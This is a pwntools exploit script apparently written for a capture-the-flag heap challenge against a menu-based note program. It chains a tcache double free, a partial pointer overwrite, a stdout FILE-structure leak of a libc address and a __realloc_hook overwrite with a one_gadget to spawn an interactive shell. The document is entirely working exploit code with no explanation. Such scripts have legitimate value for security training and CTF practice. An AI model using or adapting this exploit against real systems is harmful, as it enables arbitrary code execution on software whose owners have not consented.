from parse_args_and_some_func import *

sh:tube = all_parsed_args["io"]

cur_elf = all_parsed_args["cur_elf"]
libc = cur_elf.libc

context.update(arch="amd64", os="linux", endian="little")

def new_note(size, content="id"):
    sh.sendlineafter("Your choice:", '1')
    sh.sendlineafter("Input the size:", str(size))
    sh.sendlineafter("Input the content:", content)
    # sh.recvline()


def del_note():
    sh.sendlineafter("Your choice:", '2')

def attack(first, second):
    new_note(0x70)
    del_note()
    del_note()
    lw = input("one_byte:")
    lw = int16(lw)
    new_note(0x70, p16((lw << 8) | 0x10))
    STOP()
    new_note(0x70)
    layout = [0, 0, 0, 0, 0x07000000]
    new_note(0x70, flat(layout))
    STOP()
    del_note()
    STOP()
    new_note(0x40, p64(0) * 5)
    lw = input("one_byte:")
    lw = int16(lw)
    new_note(0x10, flat(0, p16((lw << 8) | 0x60)))
    STOP()
    del_note()

    new_note(0x40, flat(0xfbad1887, 0, 0, 0, "\x58"))
    msg = sh.recvn(8)
    leak_addr = u64(msg)
    LOG_ADDR("leak_addr", leak_addr)
    libc_base_addr = leak_addr - 0x3e82a0
    LOG_ADDR("libc_base_addr", libc_base_addr)
    realloc_hook_addr = libc_base_addr + libc.sym["__realloc_hook"]
    realloc_addr = libc_base_addr + libc.sym["realloc"]

    gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
    one_gadget = libc_base_addr + gadgets[2]
    new_note(0x10, flat(0, p64(realloc_hook_addr)[:6]))
    STOP()
    new_note(0x40, flat(one_gadget, realloc_addr+0x4))
    STOP()
    new_note(0x10)
    
    sh.interactive()

attack(0, 0)


